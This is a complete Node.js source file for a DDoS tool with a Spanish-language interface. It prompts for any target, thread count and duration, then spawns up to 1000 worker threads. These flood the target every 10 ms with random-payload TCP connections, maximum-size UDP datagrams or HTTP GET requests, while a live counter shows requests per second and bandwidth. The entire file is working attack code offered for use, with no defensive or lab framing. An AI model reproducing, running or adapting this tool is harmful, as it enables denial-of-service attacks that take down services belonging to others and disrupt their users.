#!/usr/bin/env node
'use strict';

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');
const chalk = require('chalk');
const dns = require('dns/promises');
const url = require('url');
const http = require('http');

const colors = {
    prompt: chalk.greenBright,
    error: chalk.redBright,
    success: chalk.greenBright,
    info: chalk.cyanBright,
    stat: chalk.whiteBright,
    statValue: chalk.greenBright,
    statError: chalk.redBright,
    rps: chalk.yellowBright,
    bandwidth: chalk.magentaBright,
    highlight: chalk.cyanBright.bold,
    separator: chalk.whiteBright
};

class DDoSAttack {
    constructor() {
        this.stats = { total: 0, success: 0, failed: 0, bandwidth: 0 };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'HTTP'];
        this.startTime = Date.now();
        this.statsInterval = null;
    }

    async start() {
        console.log(colors.highlight('\nIniciando ataque DDoS\n'));
        
        const target = await this.ask(colors.prompt('Objetivo (URL/IP): '));
        const { host, port } = await this.resolveTarget(target);
        const threads = await this.numberBetween(colors.prompt('Hilos (100-1000): '), 100, 1000);
        const duration = await this.numberBetween(colors.prompt('Duración (segundos): '), 10, 3600);

        console.log(colors.info(`\nObjetivo: ${host}:${port}`));
        console.log(colors.info(`Método: ${this.methods.join(', ')} (aleatorio por hilo)`));
        console.log(colors.info(`Hilos: ${threads}`));
        console.log(colors.info(`Duración: ${duration} segundos\n`));

        this.startAttack(host, port, threads);
        this.showStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    startAttack(target, port, threads) {
        const method = this.methods[Math.floor(Math.random() * this.methods.length)];
        for (let i = 0; i < threads; i++) {
            const worker = new Worker(__filename, { 
                workerData: { target, port, method }
            });
            worker.on('message', (msg) => this.updateStats(msg));
            this.workers.push(worker);
        }
    }

    updateStats(msg) {
        this.stats.total += msg.total || 0;
        this.stats.success += msg.success || 0;
        this.stats.failed += msg.failed || 0;
        this.stats.bandwidth += msg.bandwidth || 0;
    }

    showStats() {
        const render = () => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const rps = elapsed > 0 ? (this.stats.total / elapsed).toFixed(0) : 0;
            const bw = (this.stats.bandwidth / (1024 ** 2)).toFixed(2);

            readline.clearLine(process.stdout, 0);
            readline.cursorTo(process.stdout, 0);

            process.stdout.write(
                colors.highlight(`[${elapsed.toFixed(1)}s] `) +
                colors.stat('Peticiones: ') + colors.statValue(`${this.stats.total} `) +
                colors.separator('(') + colors.statValue(`${this.stats.success}`) +
                colors.separator(' | ') + colors.statError(`${this.stats.failed}`) +
                colors.separator(') ') +
                colors.rps('RPS: ') + colors.highlight(`${rps} `) +
                colors.bandwidth('BW: ') + colors.highlight(`${bw}MB`)
            );
        };

        this.statsInterval = setInterval(render, 250);
        render();
    }

    async ask(question) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise(resolve => {
            rl.question(question, answer => {
                rl.close();
                resolve(answer.trim());
            });
        });
    }

    async numberBetween(question, min, max) {
        let num;
        do num = parseInt(await this.ask(question)) || min;
        while (num < min || num > max);
        return num;
    }

    async resolveTarget(input) {
        try {
            const parsed = new url.URL(input.includes('://') ? input : `http://${input}`);
            const resolved = await dns.lookup(parsed.hostname);
            return { host: resolved.address, port: parsed.port || 80 };
        } catch {
            console.log(colors.error('\n¡Objetivo inválido!'));
            process.exit(1);
        }
    }

    stop() {
        clearInterval(this.statsInterval);
        this.workers.forEach(w => w.terminate());
        console.log(colors.success('\nAtaque detenido'));
        process.exit();
    }
}

if (!isMainThread) {
    const { target, port, method } = workerData;

    const attackMethods = {
        TCP: () => {
            const socket = net.connect(port, target);
            const payload = crypto.randomBytes(1024);
            socket.write(payload);
            socket.on('connect', () => parentPort.postMessage({ 
                total: 1, success: 1, failed: 0, bandwidth: payload.length 
            }));
            socket.on('error', () => parentPort.postMessage({ 
                total: 1, success: 0, failed: 1, bandwidth: 0 
            }));
        },
        UDP: () => {
            const socket = dgram.createSocket('udp4');
            const payload = crypto.randomBytes(65507);
            socket.send(payload, port, target, () => {
                parentPort.postMessage({ 
                    total: 1, success: 1, failed: 0, bandwidth: payload.length 
                });
                socket.close();
            }).on('error', () => parentPort.postMessage({ 
                total: 1, success: 0, failed: 1, bandwidth: 0 
            }));
        },
        HTTP: () => {
            const req = http.get(`http://${target}:${port}`, () => {
                parentPort.postMessage({ total: 1, success: 1, failed: 0, bandwidth: 0 });
            }).on('error', () => {
                parentPort.postMessage({ total: 1, success: 0, failed: 1, bandwidth: 0 });
            });
        }
    };

    const attack = () => attackMethods[method]();
    setInterval(attack, 10);
}

if (isMainThread) {
    new DDoSAttack().start();
}